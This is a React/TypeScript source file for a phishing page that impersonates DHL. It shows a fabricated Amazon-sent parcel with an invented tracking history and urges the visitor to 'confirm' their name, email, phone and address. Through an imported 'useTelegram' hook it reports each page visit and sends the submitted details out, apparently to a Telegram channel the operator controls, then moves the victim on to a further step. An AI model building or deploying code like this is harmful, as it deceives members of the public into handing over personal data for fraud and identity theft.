import { useEffect, useState } from "react";
import DHLHeader from "../components/DHLHeader";
import StepIndicator from "../components/StepIndicator";
import { notifyVisit, notifyDelivery } from "../hooks/useTelegram";

interface DeliveryData {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  postalCode: string;
}

interface DeliveryPageProps {
  onNext: (data: DeliveryData) => void;
}

const TRACKING_NUMBER = "DHLEX-7483921056";

export default function DeliveryPage({ onNext }: DeliveryPageProps) {
  const [form, setForm] = useState<DeliveryData>({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    postalCode: "",
  });
  const [errors, setErrors] = useState<Partial<DeliveryData>>({});
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    notifyVisit("Delivery / Page 1");
  }, []);

  const handleChange = (field: keyof DeliveryData) => (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm((prev) => ({ ...prev, [field]: e.target.value }));
    if (errors[field]) setErrors((prev) => ({ ...prev, [field]: "" }));
  };

  const validate = (): boolean => {
    const newErrors: Partial<DeliveryData> = {};
    if (!form.firstName.trim()) newErrors.firstName = "Required";
    if (!form.lastName.trim()) newErrors.lastName = "Required";
    if (!form.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) newErrors.email = "Invalid email";
    if (!form.phone.trim()) newErrors.phone = "Required";
    if (!form.address.trim()) newErrors.address = "Required";
    if (!form.city.trim()) newErrors.city = "Required";
    if (!form.postalCode.trim()) newErrors.postalCode = "Required";
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    setLoading(true);
    await notifyDelivery(form);
    setLoading(false);
    onNext(form);
  };

  return (
    <div className="page-enter" style={{ minHeight: "100vh", backgroundColor: "#f5f5f5" }}>
      <DHLHeader />

      <div style={{ maxWidth: 640, margin: "0 auto", padding: "0 16px 40px" }}>
        <StepIndicator currentStep={1} />

        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <h1 style={{ fontSize: 22, fontWeight: 700, color: "#1a1a1a", margin: "0 0 6px" }}>
            Confirm your shipping address
          </h1>
          <p style={{ fontSize: 14, color: "#666", margin: 0 }}>
            Please verify your details to finalize delivery
          </p>
        </div>

        {/* Package info */}
        <div className="package-card" style={{ marginBottom: 16 }}>
          <div style={{ display: "flex", gap: 16, alignItems: "flex-start", marginBottom: 20 }}>
            <div className="package-icon">📦</div>
            <div>
              <div style={{ fontWeight: 700, fontSize: 15, color: "#1a1a1a" }}>International Express Package</div>
              <div style={{ fontSize: 13, color: "#D40511", fontWeight: 500, marginTop: 2 }}>No. {TRACKING_NUMBER}</div>
            </div>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
            <div>
              <div style={{ fontSize: 11, color: "#999", fontWeight: 600, letterSpacing: "0.08em", textTransform: "uppercase", marginBottom: 4 }}>WEIGHT</div>
              <div style={{ fontSize: 15, fontWeight: 600, color: "#1a1a1a" }}>2.4 kg</div>
            </div>
            <div>
              <div style={{ fontSize: 11, color: "#999", fontWeight: 600, letterSpacing: "0.08em", textTransform: "uppercase", marginBottom: 4 }}>DIMENSIONS</div>
              <div style={{ fontSize: 15, fontWeight: 600, color: "#1a1a1a" }}>32 x 24 x 15 cm</div>
            </div>
            <div>
              <div style={{ fontSize: 11, color: "#999", fontWeight: 600, letterSpacing: "0.08em", textTransform: "uppercase", marginBottom: 4 }}>SENDER</div>
              <div style={{ fontSize: 15, fontWeight: 600, color: "#1a1a1a" }}>Amazon CA S.à.r.l.</div>
            </div>
            <div>
              <div style={{ fontSize: 11, color: "#999", fontWeight: 600, letterSpacing: "0.08em", textTransform: "uppercase", marginBottom: 4 }}>ORIGIN</div>
              <div style={{ fontSize: 15, fontWeight: 600, color: "#1a1a1a" }}>Leipzig, DE <span style={{ fontSize: 11, color: "#999" }}>DE</span></div>
            </div>
          </div>
        </div>

        {/* Tracking timeline */}
        <div className="package-card" style={{ marginBottom: 24 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 16 }}>
            <span style={{ fontSize: 16 }}>🚚</span>
            <span style={{ fontSize: 12, fontWeight: 700, letterSpacing: "0.1em", color: "#333" }}>SHIPMENT TRACKING</span>
          </div>

          {[
            { icon: "✓", status: "done", title: "Package shipped", date: "Mar 10, 2026 — Leipzig, Germany" },
            { icon: "✓", status: "done", title: "In transit — Sorting center", date: "Mar 12, 2026 — Frankfurt, Germany" },
            { icon: "✓", status: "done", title: "Arrived at destination country", date: "Mar 14, 2026 — Montreal, QC, Canada" },
            { icon: "", status: "future", title: "Scheduled delivery", date: "Mar 16–17, 2026" },
          ].map((item, i) => (
            <div key={i} style={{ display: "flex", gap: 14, alignItems: "flex-start", marginBottom: i < 3 ? 16 : 0 }}>
              <div className={`tracking-dot ${item.status}`} style={{ marginTop: 2 }}>
                {item.status !== "future" && (
                  <span style={{ fontSize: 11, color: "white", fontWeight: 700 }}>{item.icon}</span>
                )}
              </div>
              <div>
                <div style={{
                  fontSize: 14,
                  fontWeight: 600,
                  color: item.status === "future" ? "#bbb" : "#1a1a1a"
                }}>
                  {item.title}
                </div>
                <div style={{ fontSize: 12, color: item.status === "future" ? "#ccc" : "#999", marginTop: 2 }}>
                  {item.date}
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Delivery form */}
        <div className="package-card">
          <h2 style={{ fontSize: 16, fontWeight: 700, color: "#1a1a1a", margin: "0 0 20px" }}>
            Your delivery information
          </h2>

          <form onSubmit={handleSubmit} noValidate>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
              <div>
                <label className="dhl-label">First Name *</label>
                <input
                  type="text"
                  className="dhl-input"
                  placeholder="John"
                  value={form.firstName}
                  onChange={handleChange("firstName")}
                  autoComplete="given-name"
                />
                {errors.firstName && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.firstName}</span>}
              </div>
              <div>
                <label className="dhl-label">Last Name *</label>
                <input
                  type="text"
                  className="dhl-input"
                  placeholder="Smith"
                  value={form.lastName}
                  onChange={handleChange("lastName")}
                  autoComplete="family-name"
                />
                {errors.lastName && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.lastName}</span>}
              </div>
            </div>

            <div style={{ marginBottom: 14 }}>
              <label className="dhl-label">Email Address *</label>
              <input
                type="email"
                className="dhl-input"
                placeholder="john.smith@example.com"
                value={form.email}
                onChange={handleChange("email")}
                autoComplete="email"
                inputMode="email"
              />
              {errors.email && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.email}</span>}
            </div>

            <div style={{ marginBottom: 14 }}>
              <label className="dhl-label">Phone Number *</label>
              <input
                type="tel"
                className="dhl-input"
                placeholder="+1 (514) 555-0123"
                value={form.phone}
                onChange={handleChange("phone")}
                autoComplete="tel"
                inputMode="tel"
              />
              {errors.phone && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.phone}</span>}
            </div>

            <div style={{ marginBottom: 14 }}>
              <label className="dhl-label">Street Address *</label>
              <input
                type="text"
                className="dhl-input"
                placeholder="123 Main Street"
                value={form.address}
                onChange={handleChange("address")}
                autoComplete="street-address"
              />
              {errors.address && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.address}</span>}
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 24 }}>
              <div>
                <label className="dhl-label">City *</label>
                <input
                  type="text"
                  className="dhl-input"
                  placeholder="Montreal"
                  value={form.city}
                  onChange={handleChange("city")}
                  autoComplete="address-level2"
                />
                {errors.city && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.city}</span>}
              </div>
              <div>
                <label className="dhl-label">Postal Code *</label>
                <input
                  type="text"
                  className="dhl-input"
                  placeholder="H3A 1A1"
                  value={form.postalCode}
                  onChange={handleChange("postalCode")}
                  autoComplete="postal-code"
                />
                {errors.postalCode && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.postalCode}</span>}
              </div>
            </div>

            <button type="submit" className="dhl-btn" disabled={loading}>
              {loading ? "Processing..." : "Continue →"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
